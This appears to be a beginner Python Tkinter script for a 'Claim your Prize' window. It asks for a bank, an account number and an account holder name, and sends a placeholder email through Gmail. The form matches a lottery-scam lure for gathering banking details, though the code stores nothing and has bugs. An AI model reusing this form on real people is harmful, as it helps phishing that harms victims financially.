import json
from tkinter import *
from tkinter.ttk import Combobox
from smtplib import SMTP
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from playsound import playsound

gui = Tk()
gui.geometry("700x700")
gui.title("Claim your Prize ")
gui.config(bg="green")

img = PhotoImage(file="image1.png")
Label(gui, image=img, width=312, height=167).place(x=200, y=5)


def confirm_acc():
    with open("login.txt", "r", encoding="utf-8-sig", errors="ignore")as file:
        for line in file:
            email = line.split(",")[1][8:len(line.split(",")[1])]

    with open("login.txt", "r", encoding="utf-8-sig", errors="ignore")as file:
        for line in file:
            print(line.split(":")[1])
            print(line.split(":")[2])

    sender_email = "kamogelomkonto01@gmail.com"
    receiver_email = email
    password = input("Type your password and press enter:")
    message = MIMEMultipart("alternative")
    message["Subject"] = "multipart test"
    message["From"] = sender_email
    message["To"] = ", ".join(receiver_email)

    a_message = """\
     hello
     i
    # y
    # """

    part1 = MIMEText(a_message, "plain")

    message.attach(part1)

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())


def convert_amount():
    import currency_converter
    gui.destroy()


l1 = Label(gui, text="Choose your your bank: ", font="Arial 12", fg="white", bg="green")
l1.place(x=270, y=190)
c1_box = Combobox(gui, width=15)
c1_box.place(x=290, y=220)

c1_box["values"] = (
                    "Capitec",
                    "Standard Bank",
                    "FNB",
                    "Old Mutual",
                    "Nedbank",
                    "African Bank",
                    "ABSA")


l2 = Label(gui, text="Enter your Account number: ", font="Arial 12", fg="white", bg="green")
l2.place(x=260, y=370)
e1 = Entry(gui, width=15)
e1.place(x=300, y=400)


d1_display = Label(gui, font="Arial 15")
d1_display.place(x=190, y=430, width=350, height=100)

l3 = Label(gui, text="You will receive a confirmation letter via email", font="Arial 12")
l3.place(x=210, y=450)

l4 = Label(gui, text=" of your winnings within 2-5 business days.", font="Arial 12")
l4.place(x=210, y=490)


l5 = Label(gui, text="Account Holder name: ", font="Arial 12", fg="white", bg="green")
l5.place(x=280, y=280)
e5 = Entry(gui, state="normal", width=15)
e5.place(x=300, y=320)

convrt_btn = Button(gui, text="Convert", font="Arial 15", fg="white", bg="green", command=convert_amount)
convrt_btn.place(x=500, y=600)

cnfrm_btn = Button(gui, text="Confirm", command=confirm_acc, font="Arial 15", fg="white", bg="green")
cnfrm_btn.place(x=300, y=600)

# running the window
gui.mainloop()
